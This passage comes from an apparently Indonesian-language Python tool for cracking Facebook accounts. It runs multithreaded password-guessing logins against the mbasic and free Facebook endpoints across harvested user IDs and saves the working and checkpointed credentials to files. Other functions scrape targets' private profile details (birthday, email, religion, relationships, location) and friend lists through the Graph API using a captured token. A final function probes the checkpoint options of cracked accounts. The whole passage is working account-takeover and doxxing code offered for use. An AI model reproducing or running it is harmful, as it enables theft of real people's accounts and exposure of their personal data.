            ThreadPool(30).map(self.main,self.fl)
            os.remove(self.apk)
            exit()
    def main(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    print("\r%s[%sCP%s] %s • %s               "%(O,P,O,fl.get("id"),i))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s               "%(H,P,H,fl.get("id"),i))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
        except:
            self.main(fl)

def log_mbasic(em,pas,hosts):
    ua = open('ugent.txt', 'r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
class crack_mbasic:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        print('%s║'%(O))
        print('%s╠══[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(O,P,O,P))
        while True:
            f = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
            if f=="":continue
            elif f in ['m','M','2','02','002']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:
                    print(("   %s"%e))
                    continue
                print('%s╠══[%s•%s] %sContoh : sayang,bismillah,123456'%(O,P,O,P))
                self.pwlist()
                break
            elif f in ['d','D','1','01','001']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0],"pw":generate(i.split("•")[1])})
                        except:continue
                except Exception as e:
                    print(("   %s"%e))
                print('%s║'%(O))
                print('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(O,P,O,P))
                print('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
                print('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
                print('%s╚══[%s•%s] %sJika Tidak Ada Hasil, Aktifkan Mode Pesawat (5 Detik)\n'%(O,P,O,P))
                ThreadPool(35).map(self.main,self.fl)
                os.remove(self.apk)
                exit()
                break
    def pwlist(self):
        self.pw = input('%s╠══[%s•%s] %sMasukkan Password : '%(O,P,O,P)).split(",")
        if len(self.pw) ==0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            print('%s║'%(O))
            print('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(O,P,O,P))
            print('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
            print('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
            print('%s╚══[%s•%s] %sJika Tidak Ada Hasil, Aktifkan Mode Pesawat (5 Detik)\n'%(O,P,O,P))
            ThreadPool(30).map(self.main,self.fl)
            os.remove(self.apk)
            exit()
    def main(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sCP%s] %s • %s • %s %s %s   "%(O,P,O,fl.get("id"),i,d,m,y))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sCP%s] %s • %s               "%(O,P,O,fl.get("id"),i))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s               "%(H,P,H,fl.get("id"),i))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
        except:
            self.main(fl)

def log_free(em,pas,hosts):
    ua = open('ugent.txt', 'r').read()
    r = requests.Session()
    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://free.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
class crack_free:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        print('%s║'%(O))
        print('%s╠══[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(O,P,O,P))
        while True:
            f = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
            if f=="":continue
            elif f in ['m','M','2','02','002']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:
                    print(("   %s"%e))
                    continue
                print('%s╠══[%s•%s] %sContoh : sayang,bismillah,123456'%(O,P,O,P))
                self.pwlist()
                break
            elif f in ['d','D','1','01','001']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0],"pw":generate(i.split("•")[1])})
                        except:continue
                except Exception as e:
                    print(("   %s"%e))
                print('%s║'%(O))
                print('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(O,P,O,P))
                print('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
                print('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
                print('%s╚══[%s•%s] %sJika Tidak Ada Hasil, Aktifkan Mode Pesawat (5 Detik)\n'%(O,P,O,P))
                ThreadPool(35).map(self.main,self.fl)
                os.remove(self.apk)
                exit()
                break
    def pwlist(self):
        self.pw = input('%s╠══[%s•%s] %sMasukkan Password : '%(O,P,O,P)).split(",")
        if len(self.pw) ==0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            print('%s║'%(O))
            print('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(O,P,O,P))
            print('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
            print('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
            print('%s╚══[%s•%s] %sJika Tidak Ada Hasil, Aktifkan Mode Pesawat (5 Detik)\n'%(O,P,O,P))
            ThreadPool(30).map(self.main,self.fl)
            os.remove(self.apk)
            exit()
    def main(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sCP%s] %s • %s • %s %s %s   "%(O,P,O,fl.get("id"),i,d,m,y))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sCP%s] %s • %s               "%(O,P,O,fl.get("id"),i))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s               "%(H,P,H,fl.get("id"),i))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
        except:
            self.main(fl)

def target():
    try:
        token = open('token.txt','r').read()
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        menu_log()
    idt = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
        zy = json.loads(zx.text)
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P))
        menu()
    try:
        nm = zy["name"]
    except (KeyError,IOError):
        nm = ("-")
    try:
        nd = zy["first_name"]
    except (KeyError,IOError):
        nd = ("-")
    try:
        nt = zy["middle_name"]
    except (KeyError,IOError):
        nt = ("-")
    try:
        nb = zy["last_name"]
    except (KeyError,IOError):
        nb = ("-")
    try:
        ut = zy["birthday"]
    except (KeyError,IOError):
        ut = ("-")
    try:
        gd = zy["gender"]
    except (KeyError,IOError):
        gd = ("-")
    try:
        em = zy["email"]
    except (KeyError,IOError):
        em = ("-")
    try:
        lk = zy["link"]
    except (KeyError,IOError):
        lk = ("-")
    try:
        us = zy["username"]
    except (KeyError,IOError):
        us = ("-")
    try:
        rg = zy["religion"]
    except (KeyError,IOError):
        rg = ("-")
    try:
        rl = zy["relationship_status"]
    except (KeyError,IOError):
        rl = ("-")
    try:
        rls = zy["significant_other"]["name"]
    except (KeyError,IOError):
        rls = ("-")
    try:
        lc = zy["location"]["name"]
    except (KeyError,IOError):
        lc = ("-")
    try:
        ht = zy["hometown"]["name"]
    except (KeyError,IOError):
        ht = ("-")
    try:
        ab = zy["about"]
    except (KeyError,IOError):
        ab = ("-")
    try:
        lo = zy["locale"]
    except (KeyError,IOError):
        lo = ("-")
    jalan('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,nm))
    jalan('%s╠══[%s•%s] %sNama Depan : %s'%(O,P,O,P,nd))
    jalan('%s╠══[%s•%s] %sNama Tengah : %s'%(O,P,O,P,nt))
    jalan('%s╠══[%s•%s] %sNama Belakang : %s'%(O,P,O,P,nb))
    jalan('%s╠══[%s•%s] %sTTL : %s'%(O,P,O,P,ut))
    jalan('%s╠══[%s•%s] %sGender : %s'%(O,P,O,P,gd))
    jalan('%s╠══[%s•%s] %sEmail : %s'%(O,P,O,P,em))
    jalan('%s╠══[%s•%s] %sLink : %s'%(O,P,O,P,lk))
    jalan('%s╠══[%s•%s] %sUsername : %s'%(O,P,O,P,us))
    jalan('%s╠══[%s•%s] %sAgama : %s'%(O,P,O,P,rg))
    jalan('%s╠══[%s•%s] %sStatus Hubungan : %s'%(O,P,O,P,rl))
    jalan('%s╠══[%s•%s] %sHubungan Dengan : %s'%(O,P,O,P,rls))
    jalan('%s╠══[%s•%s] %sTempat Tinggal : %s'%(O,P,O,P,lc))
    jalan('%s╠══[%s•%s] %sTempat Asal : %s'%(O,P,O,P,ht))
    jalan('%s╠══[%s•%s] %sTentang : %s'%(O,P,O,P,ab))
    jalan('%s╠══[%s•%s] %sLocale : %s'%(O,P,O,P,lo))
    print('%s║'%(O))
    input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
    menu()

def teman_target():
    it = input('%s╠══[%s•%s] %sID Target : '%(O,P,O,P))
    try:
        token = open('token.txt','r').read()
        mm = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token))
        nn = json.loads(mm.text)
        print ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,nn['name']))
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        menu_log()
    tt=[]
    te=[]
    lim = input('%s╠══[%s•%s] %sLimit Dump : '%(O,P,O,P))
    print('%s║%s'%(O,P))
    ada = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token))
    idi = json.loads(ada.text)
    for x in idi['data']:
        tt.append(x['id'])
    for id in tt:
        try:
            ada2 = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(id,token))
            idi2 = json.loads(ada2.text)
            try:
                for b in idi2['data']:
                    te.append(b['id'])
            except KeyError:
                print('╠══[!] Private')
            print('╠══[•]',id,'•',len(te))
            te.clear()
        except KeyError:
            print('╠══[!] Akun Terkena Spam')
    print('║')
    input('╚══[ Kembali ]')
    menu()

def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print(("[OK] : "+str(len(Dapunta))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print("\n")
                print('%s[%s!%s] %sTidak Ada Hasil :('%(M,P,M,P))

def hasil():
    os.system("clear")
    banner()
    jalan('%s╔══[ %sHasil Crack %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCek Hasil OK'%(O,P,O,P))
    print('%s╠══[%s2%s] %sCek Hasil CP'%(O,P,O,P))
    ch = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    if ch in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK")
            print('%s║'%(O))
            print('%s╠══[%s Hasil Crack Yang Tersimpan Di File OK %s]'%(O,P,O))
            print('%s║'%(O))
            for file in okl:
                print('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            print('%s║'%(O))
            files = input('%s╚══[%s•%s] %sMasukkan Nama File : '%(O,P,O,P))
            print('')
            if files == "":
                jalan('%s═══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                hasil()
            os.system('cat OK/%s'%(files))
            ppp = open("OK/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP")
            print('%s║'%(O))
            print('%s╠══[%s Hasil Crack Yang Tersimpan Di File CP %s]'%(O,P,O))
            print('%s║'%(O))
            for file in cpl:
                print('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            print('%s║'%(O))
            files = input('%s╚══[%s•%s] %sMasukkan Nama File : '%(O,P,O,P))
            print('')
            if files == "":
                jalan('%s═══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                hasil()
            os.system('cat CP/%s'%(files))
            ppp = open("CP/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu()
    print('%s║'%(O))
    input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
    menu()

def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("%s[%s!%s] %sAkun Terkena Spam"%(M,P,M,P))
    if "c_user" in ses.cookies:
        print("%s[%s•%s] %sAkun OK Tidak Checkpoint"%(H,P,H,P))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print("%s[%s•%s] %sAkun One Tap"%(H,P,H,P))
        else:
            print("%s[%s•%s] %sTerdapat %s Opsi "%(O,P,O,P,str(len(ngew))))
        for opt in range(len(ngew)):
            print(" "*3, str(opt+1)+". "+ngew[opt])
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        print("%s[%s!%s] %s%s"%(M,P,M,P,oh))
    else:
        print("%s[%s!%s] %sPassword Telah Diubah"%(M,P,M,P))

def cek_hasil():
    jalan('%s╠══[ %sCek Opsi Akun Hasil Crack %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sContoh File : CP/%s.txt'%(O,P,O,P,tanggal))
    files = input('%s╠══[%s•%s] %sFile : '%(O,P,O,P))
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        print("%s╚══[%s!%s] %sFile Tidak Ada"%(M,P,M,P))
        time.sleep(2); cek_hasil()
    print("%s╚══[%s•%s] %sJumlah Akun : %s"%(O,P,O,P,str(len(buka_baju))))
    print("")
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("•")
        print("%s[%s•%s] %sCek Login : %s"%(O,P,O,P,kontol))
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('%s╔══[%s•%s] %sProses Pengecekan Selesai'%(O,P,O,P))
    print('%s║'%(O))
    input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
    menu()

def pro():
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    print('%s║'%(O))
    jalan('%s╠══[%s•%s] %sIni Adalah Fitur Pro'%(O,P,O,P))
    jalan('%s╠══[%s•%s] %sChat Admin Untuk Mendapat Api Key? [y/t]'%(O,P,O,P))
    pl = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    print('%s║'%(O))
    if pl in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        pro()
    elif pl in ['1','01','001','y','Y']:
        jalan('%s╠══[%s•%s] %sMembuka Whatsapp'%(O,P,O,P))
        os.system("am start https://wa.me/6282245780524?text=Hai%20Alfred!%20Gw%20%s%20Mau%20Beli%20License%20SC%20EliteFull%20Dong.%20Terima%20Kasih"%(n))
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu()
    elif pl in ['2','02','002','t','T']:
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        pro()

def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
    except:pass

if __name__=='__main__':
  os.system("git pull")
  folder()
  menu()
